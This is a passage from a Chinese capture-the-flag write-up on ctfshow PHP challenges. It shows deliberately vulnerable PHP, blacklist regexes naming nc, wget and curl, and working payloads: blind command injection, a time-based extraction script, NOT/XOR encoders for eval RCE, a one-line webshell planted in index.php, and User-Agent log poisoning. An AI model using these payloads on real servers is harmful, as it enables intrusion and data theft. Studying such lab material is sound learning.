第一行是把原始查询串解析成变量，就比如我们写 `/?a=1&b=2` ，在 `$_SERVER['QUERY_STRING']` 的时候会保留原始格式还是 `a=1&b=2` ，然后在经过了 `parse_str` 之后就会变成
`['a' => '1', 'b' => '2']`，如果是数组比如 `/?a[k1]=x&a[k2]=y` ，就会变成 `['a' => ['k1' => 'x', 'k2' => 'y']]`

> `parse_str` 的作用是把查询串解析成变量或者数组，具体是数组还是变量取决于它是单参还是双参，如果是单参的话比如 `parse_str("a=1&b=2");` 就会变成 `$a = "1" ; $b = "2"` ，而如果是
> `parse_str("a=1&b=2", $big);` 就会变成  `$big = ["a" => "1", "b" => "2"]` 

而第二行是把 `$_POST` 的键导入成变量，合起来做的工作就是 `$a=1&$b=2`

也就是我们的查询串写成 `?_POST[key1]=36d&_POST[key2]=36d`，它用 GET 发送到检查层的时候是可以过的，因为此时的顶层是 `_POST` 而不是 `key` （至于为什么要写 `_POST` 作为顶层而不是其它名字呢？是因为我们后面要用到的赋值是把这个键的名字变成了变量，而加上了 `$` 之后 `_POST` 就变成了超全局变量了

然后经过 `parse_str` 就相当于执行了 
```php
$_POST['key1'] = "36d";
$_POST['key2'] = "36d";
```

不过实际上它是
```php
$_POST = [
    "key1" => "36d",
    "key2" => "36d",
];
```

而 `extract(a)` 则是把里面的 a 数组提取出来，然后里面的键作为变量，值作为变量对应的值
于是在这里就可以相当于给 key重新赋值了，于是就可以覆盖变量了


### pt.6.2

总之就是非常困难
```php
<?php  
error_reporting(0);  
function check($x){  
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){  
        die('too young too simple sometimes naive!');  
    }  
}  
if(isset($_GET['c'])){
    $c=$_GET['c'];    
    check($c);    
    exec($c);  
}  
else{
    highlight_file(__FILE__);  
}  
?>
```
c要经过这么多过滤，之后再以shell来执行

问题两层：一是黑名单比较多，二是shell执行你看不见，因为 `/?c=ls -la` 不回显，虽然这道题我们还是可以使用盲注这样的方法来打（只能说盲注太全能了），但是这道题我们还有新的方法

我们现在只需要找个办法把内容回显，比如创建一个文件之类的，因为这个没盲注那么阴间，这道题还是可以写文件的

payload是 `ls /|tee 1` ，我们分三部分来看，第一部分是 `ls /` 这个是列出根目录的内容 ，然后是第二部分 `|` 管道，这个我们熟悉，就是把左边的结果放到右边输入，然后第三部分是 `tee 1` ， `tee` 的作用是把 stdin 复制成两份，一份继续 stdout，一份写进文件 1(落在cwd，直接就可以访问)
其实这里 `tee` 的 stdout一点用都没有，在这里用 `tee` 只是因为它有文件写入的功能而且不需要用重定向...

然后我们看到了根目录下有一个 `f149_15_h3r3` ，然后我们 `cat /f149_15_h3r3|tee 2` 即可

然后这里你可能好奇会问单独一个 1 也是可以作为文件的吗？当然可以，只不过我们访问的时候会下载下来，然后因为没有后缀，所以我们下载完之后改一下后缀变成 .txt 就行了，或者直接用 010 Editor 也可以


### pt.6.2 plus

加强
```php
<?php  
error_reporting(0);  
function check($x){  
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){  
        die('too young too simple sometimes naive!');  
    }  
}  
if(isset($_GET['c'])){    $c=$_GET['c'];    check($c);    exec($c);  
}  
else{    highlight_file(__FILE__);  
}  
?>
```
话是这么说，但是我们的 `tee` 并不能执行成功，但是我们通过时间侧信道还是找到了flag的位置就在上一个原版的地方

```http
GET /?c=test%20-e%20/f149_15_h3r3||%20sleep%201
```
因为这里不让用 `&&` ，所以我们只能用 `||` ，然后test探针是这样的

| 探针                                 | 结论     |
| ---------------------------------- | ------ |
| `test -e /f149_15_h3r3 \|\| sleep 1` | 存在文件吗  |
| `test -f ...`                      | 是普通文件吗 |
| `test -d ...`                      | 是不是目录  |
| `test -r ...`                      | 可不可读   |
| `test -s ...`                      | 非空吗    |
我们一个个试过去，首先发我们写的那个发现300毫秒返回，说明存在，其次 -f 说明是普通文件 -r 说明可读，这就足够了！

那接下来依旧时间盲注，因为我们根据上道题我们都能猜出来flag位置和格式了（事实上文件里面只有flag），所以我们依旧时间盲注，我的天哪，这也太好用了！

```python
import time
import os
import requests

s = requests.Session()
url = "https://..../"

step = 0.5
CHARSET = "0123456789abcdef-"
s.verify = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'challenge_chain.pem')


def measure_payload(p, s):
    t0 = time.perf_counter()
    s.get(url, params={"c": p}, timeout=30)
    return time.perf_counter() - t0


def measure(i, s):
    p = ("expr index \"%s\" \" `cut -c%d /f149_15_h3r3`\"|tee /tmp/n;"
         " expr `cat /tmp/n` + `cat /tmp/n` + `cat /tmp/n` + `cat /tmp/n` + `cat /tmp/n`|tee /tmp/m;"
         " busybox usleep `cat /tmp/m`00000") % (CHARSET, i)
    return measure_payload(p, s)


base = min(measure_payload("true", s) for _ in range(5))
print("base =", round(base, 3))

start = 9
flag = "ctfshow{"
while True:
    best = None
    for attempt in range(3):
        dt = measure(start, s)
        r = (dt - base) / step
        idx = int(r + 0.5)
        res = abs(r - idx)
        if res < 0.25 and 0 <= idx <= len(CHARSET):
            break
        if best is None or res < best[0]:
            best = (res, idx)
    else:
        idx = best[1]

    if 1 <= idx <= len(CHARSET):
        flag += CHARSET[idx - 1]

    print(start, idx, flag, flush=True)

    if start > 100:
        break
    start += 1
    time.sleep(0.3)
# 最后会少一个 "}" ,但是无伤大雅
```

### pt.6.3

？
```php
error_reporting(0);  
highlight_file(__FILE__);  
class ctfshow  
{  
    function __wakeup(){  
        die("private class");  
    }  
    static function getFlag(){  
        echo file_get_contents("flag.php");  
    }  
}  
  
call_user_func($_POST['ctfshow']);
```
这里是一个类，然后我们会看到 function 和 static function ，前者是实例方法，必须要有对象才行，而后者是类方法，属于类本身，不需要实例属性，不需要 new

然后这里的 `__wakeup()` 是魔术方法，至于反序列化的时候才会触发，在这里我们正常写是不会触发的

|                             | `function f()`                  | `static function f()` |
| --------------------------- | ------------------------------- | --------------------- |
| 归属                          | 对象实例                            | 类本身                   |
| 需要 new                      | 是                               | 否                     |
| `$this`                     | 有                               | 没有                    |
| 常规调用                        | `$o->f()`                       | `A::f()`              |
| `call_user_func("A::f")`    | PHP 8 报错 / PHP 7 deprecated 但能跑 | 正常                    |
| `call_user_func(["A","f"])` | 同上                              | 正常                    |
如果我们要调用类函数，就是 `类名::函数` 

那这里的payload就是 `ctfshow=ctfshow::getFlag`

```php
error_reporting(0);  
highlight_file(__FILE__);  
class ctfshow  
{  
    function __wakeup(){  
        die("private class");  
    }  
    static function getFlag(){  
        echo file_get_contents("flag.php");  
    }  
}  
  
if(strripos($_POST['ctfshow'], ":")>-1){  
    die("private function");  
}  
  
call_user_func($_POST['ctfshow']);
```
如果这样呢
`strripos($a,"x")` 的意思是在a里面找最后一个x出现的位置，而这里的意思就相当于是不能有 `:`，那不能有 `:` 我们还怎么输命令啊？我们结合之前的经验，可以想到：因为 `strripos` 针对的是字符串，那如果我们输入的是数组而报错呢？ 一个报错的返回结果和 -1 比会不会过呢？

事实上还真的是，在 PHP 7 的环境下，输入数组会返回 null ，而 `null >-1 输出 false` ，那很简单了我们只要构造数组就行

然后还有一个好消息就是 `call_user_func` 接受数组形式，但是数组必须恰好是两个元素且位置在0和1，然后如果数组是 `['A','func']` 就会等价于 `A::func()` ，而 `[$a,'func']` 则会等价于 `$a->func()` ，那么接下来的payload我都不用说就能打出来了吧 `ctfshow[]=ctfshow&ctfshow[]=getFlag`


### pt.7.1

小彻小悟
```php
error_reporting(0);  
highlight_file(__FILE__);  
if(isset($_POST['f1']) && isset($_POST['f2'])){
    $f1 = (String)$_POST['f1'];    
    $f2 = (String)$_POST['f2'];  
    if(preg_match('/^[a-z0-9]+$/', $f1)){  
        if(preg_match('/^[a-z0-9]+$/', $f2)){            $code = eval("return $f1($f2());");  
            if(intval($code) == 'ctfshow'){  
                echo file_get_contents("flag.php");  
            }  
        }  
    }  
}
```
审计代码，首先我们需要 POST f1 f2，然后这两个必须只能包含小写字母和数字，然后它是执行了两个函数，之后进入了比较

然后我们就发现明明是 intval 的函数为什么会和字符串的 `ctfshow` 相等呢？我们看到了这个是弱相等，然后intval在不同版本有不一样的输出

| 表达式                 | PHP 7.3          | PHP 8.x                           |
| ------------------- | ---------------- | --------------------------------- |
| `intval("ctfshow")` | `0`              | `0`                               |
| `0 == "ctfshow"`    | true（字符串转数字 → 0） | false（按字符串比：`"0"` vs `"ctfshow"`） |
| `1 == "ctfshow"`    | false            | false                             |
所以我们只要让 `$code=0` 即可
很简单的一个方式就是我们令 `f1=intval`，这样的话f2我们只要写一个存在的函数且返回的是字符串的（非数字）就可以，我们 f2 可以写 `getcwd` 返回当前工作目录的绝对路径，这样就可以过了，当然好像数组也是可以的，感兴趣也是可以去尝试一下


### pt.7.2

中彻中悟
```php
highlight_file(__FILE__);  
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];    
    $v2 = (String)$_GET['v2'];    
    $v3 = (String)$_GET['v3'];  
  
    if(is_numeric($v1) && is_numeric($v2)){  
        if(preg_match('/^\W+$/', $v3)){
            $code =  eval("return $v1$v3$v2;");  
            echo "$v1$v3$v2 = ".$code;  
        }  
    }  
}
```
这里的正则意思是整个字符串都有非单词字符组成，且必须有一个字符，好熟悉啊，v1 v2又必须是数字

在曾经的 QCTF 中，有一道叫做 **老叟戏顽童** 的题目，听作者放出的提示来看就是源自于这里...

>此情可待成追忆，只是当时已惘然

所以这道题当然是高位字节取反绕过，我们的 v3 是可以高位取反绕过，从而 RCE 的，而v1 v2是数字啊，数字又怎么能和命令拼接呢？这个时候我们就要想到一个 `-` ，这个减号可以把 v3当作二元运算符，虽然会 warning，但是我们的目标是让 shell 执行 v3这一串代码即可，让函数被调用了就成功了，管他报不报 warning

一个字节是 8 比特，可以表示 $2^8$ 位字符，一般来说我们用的常见字符是 0-127 位，放在比特上就是最高位为0的字节，而高位字节则是最高位是1的字节，对应的字符是 128-255位，这些都是不可见字符，好在我们可以用URL给它表示出来

然后另一个知识就是 PHP 里面 `~` 符号可以把每个字符里的 bit 翻转，那我们如果是高位字节，反转一下不就变成可读字节了吗？

顺便说一下，这道题为什么可以绕过，是因为执行层 eval 放在了正则里面，先过的正则，再取反，eval 就直接 RCE 了我们不用等后面的 echo

这是写的一个小脚本，可以留着
```python
inv = lambda s: ''.join('%%%02X' % (255 - b) for b in s.encode())

func = input('函数名: ')
arg = input('参数(可留空): ')
if arg:
    print(f'-(~{inv(func)})(~{inv(arg)})-')
else:
    print(inv(func))
```

然后就要什么自己说了


### pt.7.3

ezez
```php
error_reporting(0);  
highlight_file(__FILE__);  
if(isset($_GET['v1'])){    $v1 = (String)$_GET['v1'];  
    if(is_numeric($v1)){        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);        sleep($d);  
        echo file_get_contents("flag.php");  
    }  
}
```
`?v1=0` 非常简单，自己去读吧


### pt.7.4 这道题分明是老叟戏顽童，你连一点拿flag的机会都没有

大彻大悟
```php
highlight_file(__FILE__);  
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];    
    $v2 = (String)$_GET['v2'];    
    $v3 = (String)$_GET['v3'];  
    if(is_numeric($v1) && is_numeric($v2)){  
        if(preg_match('/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;/i', $v3)){  
                die('get out hacker!');  
        }  
        else{        
            $code =  eval("return $v1$v3$v2;");  
            echo "$v1$v3$v2 = ".$code;  
        }  
    }  
}
```
但是这里不让我们取反，我们就异或，连接就用 `*`

升级版的脚本
```python
inv = lambda s: ''.join('%%%02X' % (255 - b) for b in s.encode())
ff = lambda s: '%FF' * len(s.encode())

func = input('函数名: ')
arg = input('参数(可留空): ')
mode = input('模式 1=取反 2=异或 [1]: ') or '1'

if mode == '2':
    if arg:
        print(f'*((%22{ff(func)}%22)%5E(%22{inv(func)}%22))((%22{ff(arg)}%22)%5E(%22{inv(arg)}%22))*')
    else:
        print(f'(%22{ff(func)}%22)%5E(%22{inv(func)}%22)')
elif arg:
    print(f'-(~{inv(func)})(~{inv(arg)})-')
else:
    print(inv(func))
```


这个也没难度
```php
highlight_file(__FILE__);  
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];    
    $v2 = (String)$_GET['v2'];    
    $v3 = (String)$_GET['v3'];  
  
    if(is_numeric($v1) && check($v3)){  
        if(preg_match('/^\W+$/', $v2)){        
            $code =  eval("return $v1$v3$v2;");  
            echo "$v1$v3$v2 = ".$code;  
        }  
    }  
}  
  
function check($str){  
    return strlen($str)===1?true:false;  
}
```
你只要v3长度是1就行了，然后v2的话是末尾的二元运算符需要去掉，即可

```php
?v1=1&v2=-(~%8D%9A%9E%9B%99%96%93%9A)(~%99%93%9E%98%D1%8F%97%8F)&v3=1
```

如果是这样
```php
highlight_file(__FILE__);  
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){    $v1 = (String)$_GET['v1'];    $v2 = (String)$_GET['v2'];    $v3 = (String)$_GET['v3'];  
    if(is_numeric($v1) && is_numeric($v2)){  
        if(preg_match('/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){  
                die('get out hacker!');  
        }  
        else{            $code =  eval("return $v1$v3$v2;");  
            echo "$v1$v3$v2 = ".$code;  
        }  
    }  
}
```
我们还能用 `|` 这样的二元运算符，当然左右都要是整数
```php
/?v1=1&v2=2&v3=|(~%8D%9A%9E%9B%99%96%93%9A)(~%99%93%9E%98%D1%8F%97%8F)|
```


### pt.8.1

RRRRRCE?
```php
highlight_file(__FILE__);  
  
if(isset($_POST['ctf'])){
    $ctfshow = $_POST['ctf'];  
    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {
            $ctfshow('',$_GET['show']);  
    }  
  
}
```
正则解释为，匹配整个字符串只有大小写字母+数字+\_是，且不容忍换行，因为是感叹号取反了，所以我们需要构造一个含有至少一个非字母数字非_的 `$ctfshow` 

然后这个ctfshow函数会执行这样的语句 `ctfshow('',$show)` ，注意这里的 `''` 也算是一个参数，所以我们是二元参数，而show 这个参数是放在第二个的

也就是说我们是需要找一个内置函数，第一个参数可以选择空字符串，而第二个参数可以实现 shell 或者 eval 效果，拿到 RCE 的

我们介绍 `create_function` 这个函数，它是老 PHP 版本里运行时创建匿名函数的一个函数，其实就是一个 `eval` 启动器，因为用了这个语句就相当于是
```php
 function __lambda_func($a, $b){return $a + $b;}
```
这个函数可以不知道，前面第一个参数可以设空，问题就出在了第二个内容上：因为正常如果要执行函数是需要调用的，但是我们没有调用函数的指令。但是如果我们在b这里先写了 `}` 让内容闭包，再写我们要 RCE 的内容，就可以做到了！当然我们还要注意一下，虽然我们补了一个 `}`，但是别忘了我们后面还有一个 `}` 自带的，所以我们要给它注释掉，最好是 `/*` ，当然 `//` 也可以

### pt.8.2

```php
include 'flag.php';  
if(isset($_GET['code'])){    $code=$_GET['code'];  
    if(preg_match("/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&\*\+\- ]+/",$code)){  
        die("error");  
    }  
    @eval($code);  
}  
else{    highlight_file(__FILE__);  
}  
  
function get_ctfshow_fl0g(){  
    echo file_get_contents("flag.php");  
}
```
依旧XOR取反绕过，记得函数名后面加 `();` 即可


### pt.8.3 木马注入

不要乱试
```php
error_reporting(0);  
highlight_file(__FILE__);  
  
$files = scandir('./');   
foreach($files as $file) {  
    if(is_file($file)){  
        if ($file !== "index.php") {
                    unlink($file);  
        }  
    }  
}  
  
file_put_contents($_GET['ctf'], $_POST['show']);  
  
$files = scandir('./');   
foreach($files as $file) {  
    if(is_file($file)){  
        if ($file !== "index.php") {
                    unlink($file);  
        }  
    }  
}
```
首先我们知道首先 `$file` 被scandir('./')了，所以它是一个存放着当前工作目录的数组 ， `unlink`是删除文件，也就是第一遍它会把除了index以外的文件都删了（当然前提是这个目录有写的权限才能删，否则就会报warning，当然我们也看不懂）

那唯一写的机会在两块一模一样的代码块中间，因为我们只能读到 index.php ，所以我们肯定也是把 payload 给覆盖到 `index.php` ，然后去执行

但是这里有个悖论，如果flag.php存在且不可写，那它就没必要去删文件，除非flag.php不在这里，而且我们只能对 index.php下手，那么这个时候我们就要学一个新的东西了

想必大家都听过木马对吧，木马病毒很厉害啊，但是木马到底是什么东西
>最近看过一部叫做《奥德赛》的电影，就有这个木马。希腊神话特洛伊战争：希腊人打不下特洛伊城，造了一只巨大的木马，把士兵藏在里面。特洛伊人以为是战利品/礼物，自己把木马拉进城。夜里士兵钻出来，从内部开门，城就破了。

也就是说，**木马**相当于一个内应，平时你看不出来，但是攻击者一旦想要攻击的时候，就可以借助这个木马来轻松绕过这一个非常坚固的防线，那么这道题我们怎么注入木马？

我给出payload，因为GET很显然改不了就只能是 `ctf=index.php` ，所以我们 POST就是 `show=<?php @eval($_POST['x']);?>` ，我们发送了之后看上去 index.php 是没有什么flag的显示，实际上我们通过在index上 POST `x=...` (比如system("ls") )就可以回显在页面上！这就是木马的危害程度，而我们刚刚的这个写木马的行为也叫做**写马**（一句话木马），当然如果在面对真实的目标的时候，写马一定要授权！这可是很危险的行为！

木马注入之后就想怎么写就怎么写了


### pt.8.4 last?

超级长串
```php
include("flag.php");  
error_reporting(0);  
highlight_file(__FILE__);  
  
class CTFSHOW{  
    private $username;  
    private $password;  
    private $vip;  
    private $secret;  
  
    function __construct(){
            $this->vip = 0;        
            $this->secret = $flag;  
    }  
  
    function __destruct(){  
        echo $this->secret;  
    }  
  
    public function isVIP(){  
        return $this->vip?TRUE:FALSE;  
        }  
    }  
  
    function __autoload($class){  
        if(isset($class)){
                    $class();  
    }  
}  
  
#过滤字符  
$key = $_SERVER['QUERY_STRING'];  
if(preg_match('/\_| |\[|\]|\?/', $key)){  
    die("error");  
}  
$ctf = $_POST['ctf'];  
extract($_GET);  
if(class_exists($__CTFSHOW__)){  
    echo "class is exists!";  
}  
  
if($isVIP && strrpos($ctf, ":")===FALSE){  
    include($ctf);  
}
```
首先它给定义了一个 CTFSHOW 的类，但是这道题我们用不着这个类，因为没有new过类，没办法用，所以我们找到了个更好的方法

首先，我们看到了查询串，然后我们又看到了GET，你说如果我们把查询串变成了类似 `?isVIP=1` 的话，它的查询串在经过了PHP解析器之后会将其自动解析成数组（类似于反序列化）变成 `['isVIP' => '1']` ，到了 GET 就可以extract了，而且会令变量 `$isVIP=1` 

当然这里有过滤啊，如果我们要控制比如 `__CTFSHOW__` 这样的变量呢？没关系，因为 QUERY_STRING 是不改变原始形式的，和之前的例题很像，我们只要把它变成 URL 编码的形式就可以绕过了，这样的话我们就能控制 `__CTFSHOW__` 这个变量

然后我们来看看这个
```php
if($isVIP && strrpos($ctf, ":")===FALSE){  
    include($ctf);  
}
```
这一行到底要满足什么条件，首先要注意的是，比较的时候按照权重，是后两个先比，再比前两个的，因为我们最终是要 `include ($ctf)`，所以我们是要变成 `1 && 1` 的形式才能执行 include，所以我们的 `$ctf` 是不能有 `:` 的，且 `$isVIP=1` 或者是 `abc` 这样的形式也是可以的

那么随之而来的第二个问题：我们把请求点写在哪里？因为 ctf 不能有 :，所以我们不能写伪协议啊只能访问正常的路径，结合我们之前的知识，我们想起了 UA 注入！

直接在UA上写这个
```http
User-Agent: <?=@eval($_GET['c']);?>
```
然后我们POST `ctf=/var/log/nginx/access.log`

**然后这个payload里面的 c 后面一定要加 `;` 啊啊啊啊啊！**


好了好了这下坏了
```php
include("flag.php");  
error_reporting(0);  
highlight_file(__FILE__);  
  
class CTFSHOW{  
    private $username;  
    private $password;  
    private $vip;  
    private $secret;  
  
    function __construct(){
            $this->vip = 0;        
            $this->secret = $flag;  
    }  
  
    function __destruct(){  
        echo $this->secret;  
    }  
  
    public function isVIP(){  
        return $this->vip?TRUE:FALSE;  
        }  
    }  
  
    function __autoload($class){  
        if(isset($class)){
                    $class();  
    }  
}  
  
#过滤字符  
$key = $_SERVER['QUERY_STRING'];  
if(preg_match('/\_| |\[|\]|\?/', $key)){  
    die("error");  
}  
$ctf = $_POST['ctf'];  
extract($_GET);  
if(class_exists($__CTFSHOW__)){  
    echo "class is exists!";  
}  
  
if($isVIP && strrpos($ctf, ":")===FALSE && strrpos($ctf,"log")===FALSE){  
    include($ctf);  
}
```
这下UA不可读了，好了好了这下坏了，但是方法还是一样的，找一个我们能读到的地方

我们终于要用到我们之前提到的 CTFSHOW 的类了，我们调用一下 `$__CTFSHOW__` 之后，可以看看这个类有什么可以操作的，我们把目光投向这个 `__autoload` 我们惊讶地发现这个 `__autoload` 并不在类的里面啊，这个大括号一看就知道了

这个 `__autoload` 是老PHP的加载全局函数的方法，当类不存在的时候自动进入这个函数，然后我们看到这个函数里面是执行了一个无参的函数，也就是我们 `$__CTFSHOW__=...` 之后，这个 `...` 最后会执行一个 `...()` 的函数，直接 phpinfo
然后记得注意一下这个 `_` 要写成 `%5F`
payload `?%5F%5FCTFSHOW%5F%5F=phpinfo`

之后就在phpinfo 里面直接出了，还是有些惊喜的

可喜可贺


## 总而言之

写了两万多字的万字长文，可以说是把 php 特性给研究了很多了，当然学习是永无止境的，还要继续学习，继续学习

毕竟我这个可是写了整整两周啊...

<blockquote style="text-align:right">Cola_CaO<br>2026.11.29</blockquote>